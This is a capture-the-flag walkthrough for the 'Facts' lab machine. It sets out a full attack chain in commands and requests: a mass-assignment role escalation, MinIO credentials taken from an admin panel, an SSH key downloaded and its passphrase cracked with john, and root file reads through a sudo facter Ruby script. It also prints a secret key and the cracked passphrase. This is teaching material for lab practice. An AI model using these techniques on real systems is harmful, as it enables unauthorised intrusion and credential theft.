<h2 id="attack-chain-overview">Attack Chain Overview</h2>
<pre tabindex="0" aria-label="Code or terminal block 1"><code>Mass Assignment (role escalation) → MinIO creds leak → SSH key from MinIO bucket → SSH brute (john) → facter sudo abuse → Root
</code></pre>
<hr>
<h2 id="step-1-privilege-escalation-on-the-web-app-mass-assignment">Step 1: Privilege Escalation on the Web App (Mass Assignment)</h2>
<h3 id="what-to-do">What to do</h3>
<ol>
<li>Log in to the Facts web app with any valid user account</li>
<li>Go to <code>http://facts.htb/admin/profile/edit</code></li>
<li>Click <strong>Change Password</strong> and fill in any new password</li>
<li>Intercept the request with Burp Suite before it is sent</li>
<li>Append the following to the end of the POST body:<pre tabindex="0" aria-label="Code or terminal block 2"><code>&amp;password%5Brole%5D=admin
</code></pre>
</li>
<li>Forward the request, then refresh the admin panel</li>
</ol>
<p>The final request body should look like:</p>
<pre tabindex="0" aria-label="Code or terminal block 3"><code>_method=patch&amp;authenticity_token=&lt;TOKEN&gt;&amp;password%5Bpassword%5D=newpass&amp;password%5Bpassword_confirmation%5D=newpass&amp;password%5Brole%5D=admin
</code></pre>

<p>This is a <strong>Mass Assignment vulnerability</strong>. The web framework (Ruby on Rails style) blindly accepts any parameter that maps to a model attribute. The <code>role</code> field is a database column but not protected from user input, so we can set our own role to <code>admin</code> just by adding it to the request. The server doesn't validate whether the user is allowed to change their own role.</p>
<hr>
<h2 id="step-2-extract-minio-credentials-from-admin-panel">Step 2: Extract MinIO Credentials from Admin Panel</h2>
<h3 id="what-to-do-2">What to do</h3>
<ol>
<li>Navigate to <strong>Settings → General Site → Filesystem Settings</strong></li>
<li>Note down:<ul>
<li><strong>AWS S3 Access Key</strong> (this is the MinIO access key)</li>
<li><strong>AWS S3 Secret Key</strong> (this is the MinIO secret key)</li>
<li><strong>Endpoint:</strong> <code>http://localhost:54321</code> (exposed externally as <code>http://facts.htb:54321</code>)</li>
</ul>
</li>
</ol>

<p>The Facts app uses MinIO (a self-hosted S3-compatible object storage server) for file storage. The admin panel exposes the raw credentials in plaintext in the settings page. These credentials give us full read/write access to the MinIO buckets.</p>
<hr>
<h2 id="step-3-install-the-minio-client-mc">Step 3: Install the MinIO Client (<code>mc</code>)</h2>
<h3 id="what-to-do-3">What to do</h3>
<pre tabindex="0" aria-label="bash code or terminal block 4"><code class="language-bash" data-language="bash"># For ARM64 Kali (adjust arch if needed)
curl -O https://dl.min.io/client/mc/release/linux-arm64/mc
chmod +x mc
sudo mv mc /usr/local/bin/mc
mc --version
</code></pre>
<blockquote>
<p> <strong>Note:</strong> On some Kali systems, <code>mc</code> is already taken by Midnight Commander. The MinIO client binary may be renamed <code>midnightcommander</code> automatically. Check with <code>which mc</code> and <code>mc --version</code>.</p>
</blockquote>

<p>The <code>mc</code> (MinIO Client) is the official CLI tool to interact with MinIO/S3 buckets. We need it to browse and download files from the server.</p>
<hr>
<h2 id="step-4-connect-to-minio-and-list-buckets">Step 4: Connect to MinIO and List Buckets</h2>
<h3 id="what-to-do-4">What to do</h3>
<pre tabindex="0" aria-label="bash code or terminal block 5"><code class="language-bash" data-language="bash"># Replace with actual keys from Step 2
midnightcommander alias set facts http://facts.htb:54321 '[redacted retired-lab access key]' 'IouE+2mCrqWZ+aw+Tod69eCGQO5HnuWsFxFfkP4H'

midnightcommander ls facts/
</code></pre>
<p>Expected output:</p>
<pre tabindex="0" aria-label="Code or terminal block 6"><code>[2025-xx-xx] 0B internal/
[2025-xx-xx] 0B randomfacts/
</code></pre>

<p>We set a local alias called <code>facts</code> pointing to the MinIO server with our stolen credentials. The <code>ls</code> command lists all buckets we have access to. The <code>internal/</code> bucket is suspicious - it likely contains sensitive data not meant to be public.</p>
<hr>
<h2 id="step-5-download-the-ssh-private-key">Step 5: Download the SSH Private Key</h2>
<h3 id="what-to-do-5">What to do</h3>
<pre tabindex="0" aria-label="bash code or terminal block 7"><code class="language-bash" data-language="bash">midnightcommander get facts/internal/.ssh/id_ed25519 ./id_ed25519
</code></pre>

<p>Someone stored an SSH private key inside the MinIO <code>internal</code> bucket (specifically in a <code>.ssh/</code> folder). This is a serious misconfiguration - private keys should never be stored in object storage. Since we have read access to the bucket, we can simply download it.</p>
<hr>
<h2 id="step-6-crack-the-ssh-key-passphrase">Step 6: Crack the SSH Key Passphrase</h2>
<h3 id="what-to-do-6">What to do</h3>
<pre tabindex="0" aria-label="bash code or terminal block 8"><code class="language-bash" data-language="bash"># Convert key to john-crackable format
ssh2john ./id_ed25519 &gt; id.hash

# Crack with rockyou
john --wordlist=/usr/share/wordlists/rockyou.txt id.hash

# Show the result
john --show id.hash
</code></pre>
<p>Result: <strong><code>dragonballz</code></strong></p>

<p>The SSH key is passphrase-protected, so we can't use it directly. <code>ssh2john</code> extracts the encrypted hash from the key file into a format John the Ripper can crack. Since the passphrase is a weak dictionary word (<code>dragonballz</code>), rockyou.txt finds it quickly.</p>
<hr>
<h2 id="step-7-identify-the-username">Step 7: Identify the Username</h2>
<p>The key has the comment <code>trivia@facts.htb</code> embedded in it (visible when you ran <code>ssh-keygen -p</code> or inspected the key). This tells us the username is <strong><code>trivia</code></strong>.</p>
<p>You can also check with:</p>
<pre tabindex="0" aria-label="bash code or terminal block 9"><code class="language-bash" data-language="bash">ssh-keygen -l -f ./id_ed25519
# or
cat ./id_ed25519.pub  # if pub key exists
</code></pre>
<hr>
<h2 id="step-8-ssh-into-the-server">Step 8: SSH into the Server</h2>
<h3 id="what-to-do-7">What to do</h3>
<pre tabindex="0" aria-label="bash code or terminal block 10"><code class="language-bash" data-language="bash">chmod 600 ./id_ed25519
ssh trivia@facts.htb -i ./id_ed25519
# Enter passphrase: dragonballz
</code></pre>

<p><code>chmod 600</code> is required because SSH refuses to use private key files that are world-readable (it's a security check). Once inside, we land as user <code>trivia</code>.</p>
<hr>
<h2 id="step-9-grab-the-user-flag">Step 9: Grab the User Flag</h2>
<pre tabindex="0" aria-label="bash code or terminal block 11"><code class="language-bash" data-language="bash">cat /home/william/user.txt
# 9d7d660[redacted]5d5beb3c5
</code></pre>
<blockquote>
<p>The flag is in william's home directory, readable by trivia.</p>
</blockquote>
<hr>
<h2 id="step-10-privilege-escalation-via-facter-sudo-abuse">Step 10: Privilege Escalation via <code>facter</code> (Sudo Abuse)</h2>
<h3 id="what-to-do-8">What to do</h3>
<pre tabindex="0" aria-label="bash code or terminal block 12"><code class="language-bash" data-language="bash"># Check sudo permissions
sudo -l
# Output: (ALL) NOPASSWD: /usr/bin/facter
</code></pre>
<p><code>facter</code> is a system inventory tool used by Puppet. It supports loading <strong>custom Ruby fact scripts</strong> from a directory via <code>--custom-dir</code>. Since it runs as root, any Ruby code in that directory runs as root too.</p>
<pre tabindex="0" aria-label="bash code or terminal block 13"><code class="language-bash" data-language="bash">mkdir -p /tmp/piv

# Read root flag
echo 'puts File.read("/root/root.txt")' &gt; /tmp/piv/a.rb
sudo /usr/bin/facter --custom-dir=/tmp/piv

# Read william's flag
echo 'puts File.read("/home/william/flag.txt")' &gt; /tmp/piv/a.rb
sudo /usr/bin/facter --custom-dir=/tmp/piv
</code></pre>

<p><code>facter --custom-dir</code> tells facter to load and <strong>execute</strong> any <code>.rb</code> (Ruby) files in that directory as part of collecting system facts. Since sudo runs facter as root with no password required, our Ruby code runs as root. We use <code>File.read()</code> to read any file on the system.</p>
<blockquote>
<p> <strong>Note:</strong> <code>use_pty</code> in the sudoers config prevents getting an interactive root shell via <code>exec "/bin/sh"</code>. File read via Ruby is the workaround.</p>
</blockquote>
